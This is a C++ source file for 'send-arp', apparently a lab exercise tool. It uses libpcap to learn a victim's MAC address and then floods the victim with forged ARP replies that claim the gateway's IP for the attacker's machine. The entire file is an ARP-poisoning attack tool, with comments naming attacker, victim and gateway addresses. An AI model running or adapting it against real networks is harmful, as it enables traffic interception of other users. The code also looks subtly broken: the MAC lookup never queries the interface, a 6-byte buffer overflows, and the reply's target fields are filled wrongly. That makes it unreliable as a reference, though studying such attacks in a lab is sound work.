#include <cstdio>
#include <pcap.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"

#define MAC_ALEN 6
#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

char* getAtkIp(char *interface);
char* getAtkMac(char *interface);

void usage() {
    printf("syntax : send-arp <interface> <target ip> <victim ip>\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

// gateway = 3e:89:34:02:43:a4 192.168.244.174
// victim = a0:c5:89:ad:8e:6e 192.168.244.151


int main(int argc, char* argv[]) {
    if (argc != 4) { // send-arp wlan0 192.168.10.2 192.168.10.1
        usage();
        return -1;
    }
\
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

//    VARIABLES
    char* atkMac;
    atkMac = getAtkMac(dev);

    char* atkIp;
    atkIp = getAtkIp(dev);

    char* tgtIp;
    tgtIp = argv[2];

    char* vtmIp;
    vtmIp = argv[3];

//    =================================================================================*START* ARP REQ
    EthArpPacket packet;

    packet.eth_.smac_ = Mac(atkMac); // atkmac = "00:0c:29:38:8a:e7"
    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF"); // broadcasting
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(atkMac); // atkmac = "00:0c:29:38:8a:e7"
    packet.arp_.sip_ = htonl(Ip(atkIp)); // atkIp = my ip = "192.168.244.222"
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // unkown
    packet.arp_.tip_ = htonl(Ip(vtmIp)); // target ip = victim ip = argv[3] = "192.168.244.151"

    int res01 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res01 != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res01, pcap_geterr(handle));
    }

//    =================================================================================*END* ARP REQ


//    =================================================================================*START* SELECT REPLY
    Mac vtmMac;
    struct pcap_pkthdr* header;
    const u_char* packet2;

    int pkt2 = pcap_next_ex(handle,&header, &packet2);

    EthArpPacket* _packet = (EthArpPacket*)packet2;
    if((ntohs(EthHdr::Arp) == _packet -> eth_.type_) && (ntohs(ArpHdr::Reply) == _packet -> arp_.op_)){
        vtmMac = _packet -> arp_.smac_;
    }
//    =================================================================================*END* SELECT REPLY


//    =================================================================================*START* SEND REPLY FOR AFFECTION
    while(1) { // loop
        packet.eth_.smac_ = Mac(atkMac);
        packet.eth_.dmac_ = Mac(vtmMac); //"a0:c5:89:ad:8e:6e"
        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = Mac(atkMac); // sender mac = attacker mac
        packet.arp_.sip_ = htonl(Ip(tgtIp)); // target ip = gateway ip = argv[2] = "192.168.244.174"
        packet.arp_.tmac_ = Mac(atkMac); // target mac = atkmac
        packet.arp_.tip_ = htonl(Ip(tgtIp)); // target ip = gateway ip = argv[2] = "192.168.244.174"

        int res02 = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
        if (res02 != 0)
        {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res02, pcap_geterr(handle));
        }else{
            printf("Sent to Victim!");
        }
    }
//    =================================================================================*END* SEND REPLY FOR AFFECTION
    pcap_close(handle);
}

char* getAtkMac(char *interface){
    struct ifreq ifr;
    int skt;
    unsigned char *tmp;
    char *atkMac = (char *)malloc(sizeof(char)*6);

    skt = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);

    tmp = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    sprintf(atkMac, "%02x:%02x:%02x:%02x:%02x:%02x",tmp[0],tmp[1],tmp[2],tmp[3],tmp[4],tmp[5]); // save mac addr
    printf("Attacker's MAC addr. is %s\n", atkMac);
    return atkMac;
}

char* getAtkIp(char *interface){
    struct ifreq ifr;
    char *atkIp = (char*)malloc(sizeof(char)*40);
    int s;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);

    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        printf("Interface Error");
        exit(-1);
    }

    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, atkIp,sizeof(struct sockaddr));
    printf("Attacker's IP addr. is %s\n", atkIp);
    return atkIp;
}
